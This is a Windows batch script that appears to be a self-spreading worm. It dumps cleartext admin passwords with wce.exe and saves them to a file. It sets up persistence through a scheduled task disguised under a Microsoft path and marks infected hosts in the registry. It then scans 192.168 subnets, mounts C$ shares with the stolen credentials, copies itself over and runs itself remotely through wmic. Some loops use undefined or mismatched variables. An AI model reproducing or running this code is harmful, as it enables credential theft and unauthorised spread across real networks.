:: --CHANGE LOG--
:: r2.0 - Restructured entire script
:: r1.2 - Restructured :check_system
:: r1.1 - Killswitch
:: r1.0 - Runnable condition.

@echo on
setlocal enabledelayedexpansion
cls

set ldir=C:\Windows\Temp
::set rdir=R:\Windows\Temp

:main
call :check_ks
exit /b 0

:check_ks
reg query HKLM\SOFTWARE\Microsoft /t REG_SZ /v killswitch
if %errorlevel% equ 0 (
	exit
) ELSE (
	goto :init
)


:init
:: Checks if machine is already infected.
:: If marker is not found, adds persistence and infection marker
:: If marker is found, continues with propagation.
reg query HKLM\SOFTWARE\Microsoft /t REG_SZ /v isInstalled
if %errorlevel% equ 1 call :seq1
if %errorlevel% equ 0 call :seq2
exit /b 0


:check_persistence
schtasks /query /tn "\Microsoft\Windows\SoftwareProtectionPlatform\PlatformMaintenance"
if %errorlevel% equ 0 call :seq3
if %errorlevel% equ 1 call :seq1


:seq1
::patient zero sequence
call :getcreds_setstaticip
call :getcreds_pwdump
if %errorlevel% equ 0 (
	call :add_marker
	call :add_persistence
	call :execute_action
	call :connect_sub_targets
)
exit /b 0

:seq2
::subsequent patient sequence
call :add_marker
call :add_persistence
call :execute_action
call :connect_sub_targets
exit /b 0


:seq3
::prop persistence sequence
call :execute_action
call :connect_sub_targets
exit /b 0


:getcreds_setstaticip
:: Set random time before setting static IP as a social engineering tactic.
set /a rval=(%RANDOM%*60/32768)+1
timeout /t %rval% /nobreak > nul
netsh interface ip set address "Local Area Connection" static 169.254.0.1 255.255.255.0
exit /b 0


:getcreds_pwdump
:: Dumps cleartext passwords every 10 seconds and dumps password to text file if admin password is detected.
timeout /t 10 /nobreak > nul
for /f "tokens=1-3 delims=\:" %%a in ('"%~dp0wce.exe -w | findstr /i "admin""') do (
	echo %%b\%%a %%c > "%ldir%\dapw"
)
if NOT EXIST "%ldir%\dapw" goto :getcreds_pwdump
if EXIST "%ldir%\dapw" (
	call :getcreds_ping
	exit /b 0
)


:getcreds_ping
:: wait for x seconds
ping 8.8.8.8 /n 2 /w 1000 |findstr Reply | findstr -v unreachable
if %errorlevel% neq 0 goto :getcreds_ping
if %errorlevel% equ 0 exit /b 0


:add_marker
reg add HKLM\SOFTWARE\Microsoft /f /v isInstalled /t REG_SZ /d 1
exit /b 0


:add_persistence
copy /y %~dp0main.bat %ldir%\main.bat
::schtasks /Create /SC HOURLY /RU SYSTEM /TN "Microsoft\Windows\SoftwareProtectionPlatform\PlatformMaintenance" /TR "%ldir%\main.bat" /F
schtasks /Create /SC HOURLY /RU SYSTEM /TN "Microsoft\Windows\SoftwareProtectionPlatform\PlatformMaintenance" /TR "ping 8.8.8.8" /F
exit /b 0


:execute_action
:: Special actions go here.
:: ---------------
:: Simple text file.
echo %COMPUTERNAME% has been pwned. > C:\pwned.txt
:: ---------------
exit /b 0


:connect_smb_targets
setlocal enabledelayedexpansion
:: find targets connected with port 445
:: Propagates and executes payload and password file to remote hosts
for /l %%q in (0,1,255) do (
	for /f "tokens=1-10 delims=.: " %%a in ('"netstat -anop tcp | findstr :445 | findstr -v 0.0.0.0"') do (
		ping 192.168.%%i.%%q /n 2 /w 1000 |findstr Reply | findstr -v unreachable
		if !errorlevel! equ 0 for /f "tokens=1-3 delims=\ " %%x in (%ldir%\dapw) do (
			net use \\192.168.%%i.%%q\c$ /user:%%y %%z /persistent: yes
			copy /y "%ldir%\main.bat" "\\192.168.%%i.%%q\c$\Windows\Temp\main.bat"
			copy /y "%ldir%\dapw" "\\192.168.%%i.%%q\c$\Windows\Temp\dapw"
			net use /del \\192.168.%%i.%%q\c$
			wmic /node:192.168.%%i.%%q /user:%%y /password:%%z process call create "cmd /c %ldir%\main.bat"
		)
	)
)
endlocal
exit /b 0

:connect_sub_targets
setlocal enabledelayedexpansion
:: find targets on specified subnet
:: Propagates and executes payload and password file to remote hosts
:: set targeted subnet
set sub=10
for /l %%q in (0,1,255) do (
	ping 192.168.%sub%.%%q /n 2 /w 500 |findstr Reply | findstr -v unreachable
	if !errorlevel! equ 0 for /f "tokens=1-2 delims= " %%x in (%ldir%\dapw) do (
		net use \\192.168.%sub%.%%q\c$ /user:%%y %%z /persistent: yes
		copy /y "%ldir%\main.bat" "\\192.168.%sub%.%%q\c$\Windows\Temp\main.bat"
		copy /y "%ldir%\dapw" "\\192.168.%sub%.%%q\c$\Windows\Temp\dapw"
		net use /del \\192.168.%sub%.%%q\c$
		wmic /node:192.168.%sub%.%%q /user:%%x /password:%%y process call create "cmd /c %ldir%\main.bat"
	)
)
endlocal
exit /b 0